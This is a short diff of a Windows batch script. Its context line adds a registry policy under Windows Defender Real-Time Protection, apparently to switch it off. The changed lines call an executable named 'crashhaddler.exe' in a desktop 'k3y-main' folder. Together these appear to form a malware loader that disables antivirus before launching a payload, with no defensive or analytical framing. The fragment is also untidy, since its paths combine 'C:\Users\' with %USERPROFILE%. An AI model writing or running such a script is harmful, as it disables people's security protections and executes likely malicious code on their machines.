@@ -43,8 +43,9 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Ti
 
 timeout /t 1 > nul
 
-call "C:\Users\%USERPROFILE%\Desktop\k3y-main\k3y-main\crashhaddler.exe"
-"C:\Users\lilmu\Desktop\my tool\
+call C:\Users\%USERPROFILE%\Desktop\k3y-main\k3y-main\crashhaddler.exe
+call C:\Users\%USERPROFILE%\Desktop\k3y-main\crashhaddler.exe
+
 timeout /t 1 > nul
 
 
